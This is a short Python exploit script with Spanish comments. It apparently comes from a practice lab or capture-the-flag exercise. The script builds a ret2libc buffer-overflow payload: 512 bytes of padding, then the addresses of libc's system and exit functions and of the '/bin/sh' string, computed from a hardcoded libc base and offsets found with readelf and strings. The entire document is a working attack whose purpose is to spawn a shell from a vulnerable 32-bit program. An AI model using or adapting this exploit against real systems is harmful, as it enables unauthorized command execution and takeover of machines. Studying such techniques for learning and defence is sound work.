```
#!/usr/bin/python3

from struct import pack

import signal, sys

def def_handler(sig, frame):
	print('\n[!] Saliendo...\n')
	sys.exit(1)
	
#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	
	offset = 512
	junk = b"A"*offset
	
	#ret2libc -> EIP -> system_addr + exit_addr + bin_sh_addr
	base_libc_addr = 0xf755b000
	
	# readelf -s /lib32/libc.so.6 | grep -E " system@@| exit@@"
	# 0x0002e7b0 --> exit@@GLIBC_2.0
	# 0x0003a940 --> system@@GLIBC_2.0
	# strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
	# 15900b /bin/sh
	
	system_addr_off = 0x0003a940
	exit_addr_off = 0x0002e7b0
	bin_sh_addr_off = 0x0015900b
	
	system_addr = pack("<I", base_libc_addr + system_addr_off)
	exit_addr = pack("<I", base_libc_addr + exit_addr_off)
	bin_sh_addr = pack("<I", base_libc_addr + bin_sh_addr_off)
	
	payload = junk + system_addr + exit_addr + bin_sh_addr
	
	sys.stdout.buffer.write(payload)
	
```